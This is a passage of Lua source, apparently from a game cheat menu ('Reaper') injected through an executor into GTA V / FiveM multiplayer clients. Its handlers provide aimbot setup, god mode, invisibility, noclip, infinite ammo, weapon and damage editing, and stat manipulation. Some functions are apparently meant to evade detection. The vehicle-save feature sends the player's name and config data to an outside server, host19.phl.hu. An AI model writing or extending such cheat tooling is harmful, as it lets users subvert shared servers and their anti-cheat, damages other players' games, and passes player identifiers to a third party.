                    __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A['player:particle_particle'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A['player:particle_particle'].sindex].name, coords.x, coords.y, coords.z, __REAPER1__.F.IntToFloat(__REAPER1__.A['player:particle_scale'].sindex),  __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['player:particle_rotation'].func, ' ', true), __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['player:particle_axis'].func, ' ', true))
                end,
                loopparticle = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.ParticleDelay = __REAPER1__.N.GetGameTimer()
                end,
            },
            stateditor = {
                strength = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_STRENGTH`, p4 - 1, true)
                end,
                stamina = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_STAMINA`, p4 - 1, true)
                end,
                lung = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_LUNG_CAPACITY`, p4 - 1, true)
                end,
                shooting = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_SHOOTING_ABILITY`, p4 - 1, true)
                end,
                wheelie = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_WHEELIE_ABILITY`, p4 - 1, true)
                end,
                driving = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_DRIVING_ABILITY`, p4 - 1, true)
                end,
                flying = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.StatSetInt(`MP0_FLYING_ABILITY`, p4 - 1, true)
                end,
            },
        },
        weapon = {
            upgradeweapons = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in pairs(__REAPER1__.T.Display) do
                    local wep = __REAPER1__.F.StringSplit(k, ':')[2]
                    if wep then
                        local hash = __REAPER1__.N.GetHashKey('weapon_' .. wep)
                        if __REAPER1__.T.WeaponsHash[hash] then
                            for _k,_v in ipairs(v) do
                                if _v.extra then
                                    __REAPER1__.N.GiveWeaponComponentToPed(__REAPER1__.V.SelfPed, hash, _v.extra)
                                end
                            end
                        end
                    end
                end
            end,
            downgradeweapons = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in pairs(__REAPER1__.T.Display) do
                    local wep = __REAPER1__.F.StringSplit(k, ':')[2]
                    if wep then
                        local hash = __REAPER1__.N.GetHashKey('weapon_' .. wep)
                        if __REAPER1__.T.WeaponsHash[hash] then
                            for _k,_v in ipairs(v) do
                                if _v.extra then
                                    __REAPER1__.N.RemoveWeaponComponentFromPed(__REAPER1__.V.SelfPed, hash, _v.extra)
                                end
                            end
                        end
                    end
                end
            end,
            maxammo = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.Weapons) do
                    __REAPER1__.N.SetPedAmmo(__REAPER1__.V.SelfPed, __REAPER1__.N.GetHashKey('WEAPON_' .. v), 9999)
                end
            end,
            removeammo = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.Weapons) do
                    __REAPER1__.N.SetPedAmmo(__REAPER1__.V.SelfPed, __REAPER1__.N.GetHashKey('WEAPON_' .. v), 0)
                end
            end,
            accuary = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedAccuracy(__REAPER1__.V.SelfPed, p4)
            end,
            weapontint = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.Weapons) do
                    local wep = v ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. v) or __REAPER1__.N.GetHashKey('GADGET_' .. v)
                    __REAPER1__.N.SetPedWeaponTintIndex(__REAPER1__.V.SelfPed, wep, p4 - 1)
                end
            end,
            infiniteammoinclip = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedInfiniteAmmoClip(__REAPER1__.V.SelfPed, p1)
            end,
            forcereload = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.MakePedReload(__REAPER1__.V.SelfPed)
            end,
            invisibleweapon = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityVisible(__REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed), not p2)
            end,
            setbestweapon = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetCurrentPedWeapon(__REAPER1__.V.SelfPed, __REAPER1__.N.GetBestPedWeapon(__REAPER1__.V.SelfPed, 0), true)
            end,
            setweapon = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetCurrentPedWeapon(__REAPER1__.V.SelfPed, __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]), true)
            end,

            giveorremove = {
                weapon = function(p1, p2, p3, p4, p5, p6, p7)
                    local wep = p4 and p2[p4] or p2 --kell hogy ne legyen a p4 nil customn??l
                    local theWeaponHash = wep ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. wep) or __REAPER1__.N.GetHashKey('GADGET_' .. wep)
                    if not __REAPER1__.N.HasPedGotWeapon(__REAPER1__.V.SelfPed, theWeaponHash, false) then
                        __REAPER1__.N.GiveWeaponToPed(__REAPER1__.V.SelfPed, theWeaponHash, __REAPER1__.A['weapon:weapon_ammo'].func, false, __REAPER1__.A['weapon:weapon_equipinstantly'].func)
                    else
                        __REAPER1__.N.RemoveWeaponFromPed(__REAPER1__.V.SelfPed, theWeaponHash)
                        if __REAPER1__.A['weapon:weapon_withammo'].func then
                            __REAPER1__.N.SetPedAmmo(__REAPER1__.V.SelfPed, theWeaponHash, 0)
                        end
                    end
                end,
                allweapons = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.Weapons) do
                        local theWeaponHash = v ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. v) or __REAPER1__.N.GetHashKey('GADGET_' .. v)
                        __REAPER1__.N.GiveWeaponToPed(__REAPER1__.V.SelfPed, theWeaponHash, __REAPER1__.A['weapon:weapon_ammo'].func, false, __REAPER1__.A['weapon:weapon_equipinstantly'].func)
                    end
                end,
                removeallweapons = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.Weapons) do
                        local theWeaponHash = v ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. v) or __REAPER1__.N.GetHashKey('GADGET_' .. v)
                        __REAPER1__.N.RemoveWeaponFromPed(__REAPER1__.V.SelfPed, theWeaponHash)
                        if __REAPER1__.A['weapon:weapon_withammo'].func then
                            __REAPER1__.N.SetPedAmmo(__REAPER1__.V.SelfPed, theWeaponHash, 0)
                        end
                    end
                end,
                current = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed)
                    __REAPER1__.N.RemoveWeaponFromPed(__REAPER1__.V.SelfPed, weapon)
                    if __REAPER1__.A['weapon:weapon_withammo'].func then
                        __REAPER1__.N.SetPedAmmo(__REAPER1__.V.SelfPed, weapon, 0)
                    end
                end,
            },
            editor = {
                setammo = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    __REAPER1__.N.SetPedAmmoByType(__REAPER1__.V.SelfPed, __REAPER1__.N.GetPedAmmoTypeFromWeapon(__REAPER1__.V.SelfPed, weapon), p4 - 1)
                end,
                addammo = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    __REAPER1__.N.AddAmmoToPedByType(__REAPER1__.V.SelfPed, __REAPER1__.N.GetPedAmmoTypeFromWeapon(__REAPER1__.V.SelfPed, weapon), p4 - 1)
                end,
                setammoinclip = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    __REAPER1__.N.SetAmmoInClip(__REAPER1__.V.SelfPed, weapon, p4 - 1)
                end,
                infinite = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    __REAPER1__.N.SetPedInfiniteAmmo(__REAPER1__.V.SelfPed, p2, weapon)
                end,
                damage = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    __REAPER1__.N.SetWeaponDamageModifier(weapon, p2)
                end,
                component = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = __REAPER1__.F.WeaponEditorWeapon(p1)
                    if p2 then
                        __REAPER1__.N.GiveWeaponComponentToPed(__REAPER1__.V.SelfPed, weapon, p6)
                    else
                        __REAPER1__.N.RemoveWeaponComponentFromPed(__REAPER1__.V.SelfPed, weapon, p6)
                    end
                end,
            },
            debuggun = {
                debuggun = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.DebugGunEntity = nil
                end
            }
        },
        combat = {
            aa = function(p1, p2, p3, p4, p5, p6, p7)
                if p5 then
                    if not __REAPER1__.A['combat_exception'].toggle then
                        __REAPER1__.F.AddNotification('Highly suggested to use with a exception.', 2000, 200, 200, 200)
                    end
                else
                    __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed, true)
                end
            end,
            infinitecombatroll = function(p1, p2, p3, p4, p5, p6, p7)
                if p2 then
                    __REAPER1__.V.CombatrollStat = __REAPER1__.N.StatGetInt(`MP0_SHOOTING_ABILITY`, -1)
                    __REAPER1__.N.StatSetInt(`MP0_SHOOTING_ABILITY`, 1100, true)
                else
                    __REAPER1__.N.StatSetInt(`MP0_SHOOTING_ABILITY`, __REAPER1__.V.CombatrollStat, true)
                end
            end,
            aimbot = {
                buildfov = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.AimfovBuild()
                end,
            },
            visuals = {
                tracebullets = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.BulletTrace = {}
                end,
                traceimpacts = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.ImpactTrace = {}
                end,
            },
        },
        vehicle = {
            delete = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.DeleteEntity(__REAPER1__.V.CurrentVehicle)
            end,
            fuel = function(p1, p2, p3, p4, p5, p6, p7)
                if __REAPER1__.N.DecorExistOn(__REAPER1__.V.CurrentVehicle, "_FUEL_LEVEL") then
                    __REAPER1__.N.DecorSetFloat(__REAPER1__.V.CurrentVehicle, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                else
                    __REAPER1__.N.SetVehicleFuelLevel(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p4 - 1))
                end
            end,
            fuckupveh = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.FuckUpVeh(__REAPER1__.V.CurrentVehicle)
            end,
            removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.RemoveWheel(__REAPER1__.V.CurrentVehicle)
            end,
            seat = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, __REAPER1__.V.CurrentVehicle, p4 - 2)
            end,
            stickinveh = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedCanBeDraggedOut(__REAPER1__.V.SelfPed, not p2)
            end,
            dirtiness = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetVehicleDirtLevel(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p4 - 1))
            end,
            godmode = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.CurrentVehicle, p2)
            end,
            invisible = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.CurrentVehicle, not p2)
            end,
            alpha = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityAlpha(__REAPER1__.V.CurrentVehicle, p2[p4], false)
            end,
            novehiclegravity = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetVehicleGravity(__REAPER1__.V.CurrentVehicle, not p2)
            end,
            nofall = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedCanBeKnockedOffVehicle(__REAPER1__.V.SelfPed, p2 and 1 or 0)
            end,
            noshotinveh = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedCanBeShotInVehicle(__REAPER1__.V.SelfPed, not p2)
            end,
            lightmultiplier = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetVehicleLightMultiplier(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p2[p4]))
            end,
            enginesound = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ForceVehicleEngineAudio(__REAPER1__.V.CurrentVehicle, p2[p4])
            end,
            saved = {
                save = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.V.CurrentVehicle ~= 0 then
                            local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'Vehicle save name')
                            if ret then
                                local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                                local vehicle = __REAPER1__.N.GetVehProperties(__REAPER1__.V.CurrentVehicle)
                
                                if t ~= nil then
                                    if not t['v'] then t['v'] = {} end
                                    t['v'][ret] = vehicle
                                    __REAPER1__.F.WebSave('::stuff::hju456j', t, 5000)
                                else
                                    local t = {['v'] = {[ret] = vehicle}}
                                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)
                                end

                                if __REAPER1__.T.Display['vehicle:savedvehicle'][2] == nil then
                                    __REAPER1__.T.Display['vehicle:savedvehicle'][2] = {text = 'Vehicles', option = __REAPER1__.M.Separator}
                                    local dkey = 'vehicle:savedvehicle' .. ret .. 3
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' vehicle modifications menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:savedvehicle', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    __REAPER1__.T.Display['vehicle:savedvehicle'][3] = t
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Set', dkey = dkey .. '_set', desc = 'Set these vehicle modifications.', afu = __REAPER1__.M.vehicle.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this vehicle modification.', afu = __REAPER1__.M.vehicle.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                else
                                    local dkey = 'vehicle:savedvehicle' .. ret .. #__REAPER1__.T.Display['vehicle:savedvehicle']
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' vehicle modifications menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:savedvehicle', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    table.insert(__REAPER1__.T.Display['vehicle:savedvehicle'], t)
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Set', dkey = dkey .. '_set', desc = 'Set these vehicle modifications.', afu = __REAPER1__.M.vehicle.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this vehicle modification.', afu = __REAPER1__.M.vehicle.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                end

                                __REAPER1__.F.AddNotification('Saved vehicle: ' .. ret, 5000, 0, 170, 10)
                            end
                        else
                            __REAPER1__.F.AddNotification('Vehicle not found.', 5000, 255, 0, 0)
                        end
                    end)
                end,
                load = function(p1, p2, p3, p4, p5, p6, p7)
                    local text = __REAPER1__.A[p6].text
                    local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
            
                    if __REAPER1__.N.GetEntityModel(__REAPER1__.V.CurrentVehicle) == t['v'][text].model then
                        __REAPER1__.N.SetVehProperties(__REAPER1__.V.CurrentVehicle, t['v'][text])
                        __REAPER1__.F.AddNotification('Set vehicle: ' .. text, 5000, 0, 170, 10)
                    else
                        __REAPER1__.F.AddNotification('Vehicle models don\'t match.', 5000, 255, 0, 0)
                    end
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    local text = __REAPER1__.A[p6].text
                    local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                    
                    t['v'][text] = nil
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)

                    __REAPER1__.F.DeleteConfigTab('vehicle:savedvehicle', p6, 3)
                    __REAPER1__.F.AddNotification('Deleted vehicle: ' .. text, 5000, 0, 170, 10)
                end,
            },
            spawner = {
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local veh = p4 and p2[p4] or p2
                        local hash = __REAPER1__.N.GetHashKey(veh)
                        if __REAPER1__.F.RequestEntity(hash) then
                            local veh = __REAPER1__.N.CreateVehicle(hash, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed), true, true)
                            if __REAPER1__.A['vehicle:spawner_licenseplate'].func ~= 'None' then
                                __REAPER1__.N.SetVehicleNumberPlateText(veh, __REAPER1__.A['vehicle:spawner_licenseplate'].func)
                            end
                            
                            if __REAPER1__.A['vehicle:spawner_inside'].func then
                                __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, veh, -1)
                            end
                        end
                    end)
                end,
            },
            customs = {
                tunefully = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.F.IsInVeh(__REAPER1__.V.SelfPed, 'Tuned vehicle.') then
                        __REAPER1__.N.TuneVehicle(__REAPER1__.V.CurrentVehicle)
                    end
                end,
                downgrade = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.F.IsInVeh(__REAPER1__.V.SelfPed, 'Downgraded vehicle.') then
                        __REAPER1__.N.DowngradeVeh(__REAPER1__.V.CurrentVehicle)
                    end
                end,
                randomizelook = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.RandomizeVehLook(__REAPER1__.V.CurrentVehicle)
                end,
                modkit = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleModKit(__REAPER1__.V.CurrentVehicle, p2[p4])
                end,
                platetext = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleNumberPlateText(__REAPER1__.V.CurrentVehicle, p2)
                end,
                platetype = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleNumberPlateTextIndex(__REAPER1__.V.CurrentVehicle, p4)
                end,
                wheelheight = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleSuspensionHeight(__REAPER1__.V.CurrentVehicle, - __REAPER1__.F.IntToFloat(p2[p4]) / 30)
                end,
                vehiclemod = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleMod(__REAPER1__.V.CurrentVehicle, p6, p2[p1 == 'vehicle:customs_horns' and p4 - 2 or p4], false)
                end,
                togglevehiclemod = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ToggleVehicleMod(__REAPER1__.V.CurrentVehicle, p6, p2)
                end,
                windowtint = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleWindowTint(__REAPER1__.V.CurrentVehicle, p2[p4 - 1])
                end,
                extra = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleExtra(__REAPER1__.V.CurrentVehicle, p2[p4], __REAPER1__.N.IsVehicleExtraTurnedOn(__REAPER1__.V.CurrentVehicle, p2[p4]))
                end,
                respray = {
                    enveffscale = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleEnveffScale(__REAPER1__.V.CurrentVehicle, p1)
                    end,
                    primary = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleModColor_1(__REAPER1__.V.CurrentVehicle, p6, __REAPER1__.T.VehicleColours[p2[p4]], 0)
                        __REAPER1__.N.SetVehicleColours(__REAPER1__.V.CurrentVehicle, __REAPER1__.T.VehicleColours[p2[p4]])
                    end,
                    primaryc = function(p1, p2, p3, p4, p5, p6, p7)
                        local r, g, b = __REAPER1__.F.MenuExtra(p1)
                        __REAPER1__.N.SetVehicleCustomPrimaryColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                    end,
                    primaryc2 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleModColor_1(__REAPER1__.V.CurrentVehicle, 5, 0, 0)
                        __REAPER1__.N.SetVehicleColours(__REAPER1__.V.CurrentVehicle, 120)
                    end,
                    secondary = function(p1, p2, p3, p4, p5, p6, p7)
                        local primary, secondary = __REAPER1__.N.GetVehicleColours(__REAPER1__.V.CurrentVehicle)
                        __REAPER1__.N.SetVehicleModColor_2(__REAPER1__.V.CurrentVehicle,  p6, __REAPER1__.T.VehicleColours[p2[p4]], 0)
                        __REAPER1__.N.SetVehicleColours(__REAPER1__.V.CurrentVehicle, primary, __REAPER1__.T.VehicleColours[p2[p4]])
                    end,
                    secondaryc = function(p1, p2, p3, p4, p5, p6, p7)
                        local r, g, b = __REAPER1__.F.MenuExtra(p1)
                        __REAPER1__.N.SetVehicleCustomSecondaryColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                    end,
                    secondaryc2 = function(p1, p2, p3, p4, p5, p6, p7)
                        local primary, secondary = __REAPER1__.N.GetVehicleColours(__REAPER1__.V.CurrentVehicle)
                        __REAPER1__.N.SetVehicleModColor_2(__REAPER1__.V.CurrentVehicle, 5, 0, 0)
                        __REAPER1__.N.SetVehicleColours(__REAPER1__.V.CurrentVehicle, primary, 120)
                    end,
                    pearl = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleExtraColours(__REAPER1__.V.CurrentVehicle, __REAPER1__.T.VehicleColours[p2[p4]])
                    end,
                    pearlc2 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleExtraColours(__REAPER1__.V.CurrentVehicle, 120)
                    end,
                    wheel = function(p1, p2, p3, p4, p5, p6, p7)
                        local pearl, wheel = __REAPER1__.N.GetVehicleExtraColours(__REAPER1__.V.CurrentVehicle)
                        __REAPER1__.N.SetVehicleExtraColours(__REAPER1__.V.CurrentVehicle, pearl, 120)
                    end,
                    wheelc2 = function(p1, p2, p3, p4, p5, p6, p7)
                        local pearl, wheel = __REAPER1__.N.GetVehicleExtraColours(__REAPER1__.V.CurrentVehicle)
                        __REAPER1__.N.SetVehicleExtraColours(__REAPER1__.V.CurrentVehicle, pearl, __REAPER1__.T.VehicleColours[p2[p4]])
                    end,
                },
                neonlights = {
                    color = function(p1, p2, p3, p4, p5, p6, p7)
                        local r, g, b = __REAPER1__.F.MenuExtra(p1)
                        __REAPER1__.N.SetVehicleNeonLightsColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                    end,
                    neon = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleNeonLightEnabled(__REAPER1__.V.CurrentVehicle, p6, not __REAPER1__.N.IsVehicleNeonLightEnabled(__REAPER1__.V.CurrentVehicle, p6))
                    end,
                },
                xenonlights = {
                    color = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleXenonLightsColour(__REAPER1__.V.CurrentVehicle, p2[p4])
                    end,
                    enable = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.ToggleVehicleMod(__REAPER1__.V.CurrentVehicle, 22, true)
                    end,
                    disable = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.ToggleVehicleMod(__REAPER1__.V.CurrentVehicle, 22, false)
                    end,
                },
                wheels = {
                    wheel = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleWheelType(__REAPER1__.V.CurrentVehicle, p7)
                        __REAPER1__.N.SetVehicleMod(__REAPER1__.V.CurrentVehicle, p6, p4 and p4 - 1 or -1, 0)
                    end,
                    bulletproof = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.N.SetVehicleTyresCanBurst(__REAPER1__.V.CurrentVehicle, p2)
                    end,
                    color = function(p1, p2, p3, p4, p5, p6, p7)
                        local r, g, b = __REAPER1__.F.MenuExtra(p1)
                        __REAPER1__.N.SetVehicleTyreSmokeColor(__REAPER1__.V.CurrentVehicle, r, g, b)
                    end,
                },
            },
            fixing = {
                enginehealth = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleEngineHealth(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p2[p4]))
                end,
                bodyhealth = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleBodyHealth(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p4 - 1))
                end,
                vehicle = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FixVehicle(__REAPER1__.V.CurrentVehicle)
                end,
                deformation = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDeformationFixed(__REAPER1__.V.CurrentVehicle)
                end,
                tires = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FixVehicleTires(__REAPER1__.V.CurrentVehicle)
                end,
                windows = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FixVehicleWindows(__REAPER1__.V.CurrentVehicle)
                end,
            },
            movement = {
                autodrive = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 then
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                    else
                        __REAPER1__.V.AutoDrive = false
                    end
                end,
                drivetowp = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 and __REAPER1__.V.DrivingToWp then
                        __REAPER1__.V.DrivingToWp = nil
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                    end
                end,
                easyhandling = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleGravityAmount(__REAPER1__.V.CurrentVehicle, p2 and 30.0 or 9.8)
                end,
                maxspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityMaxSpeed(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                end,
                setspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleForwardSpeed(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                end,
                topspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ModifyVehicleTopSpeed(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(p1))
                end,
                flip = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['vehicle:movement_onlyinair'].func and __REAPER1__.N.IsEntityInAir(__REAPER1__.V.CurrentVehicle) or not __REAPER1__.A['vehicle:movement_onlyinair'].func then
                        __REAPER1__.N.SetEntityRotation(__REAPER1__.V.CurrentVehicle, 0, 0, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.CurrentVehicle), 1, true)
                    end
                end,
                flying = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.CurrentVehicle, p2)

                    if __REAPER1__.A['vehicle:movement_wextra'].sindex == 2 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, p2)
                    elseif __REAPER1__.A['vehicle:movement_wextra'].sindex == 3 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120, not p2)
                    elseif __REAPER1__.A['vehicle:movement_wextra'].sindex == 4 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, p2)
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120, not p2)
                    end
                end,
                wextra = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['vehicle:movement_flying'].func then
                        if p4 == 2 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, true)
                        elseif p4 == 4 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, true)
                        elseif p4 == 1 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, false)
                        end
                    end
                end,
                wlagging = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.FlyingTimer = __REAPER1__.N.GetGameTimer()
                end,
                noclip = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.CurrentVehicle, p2)

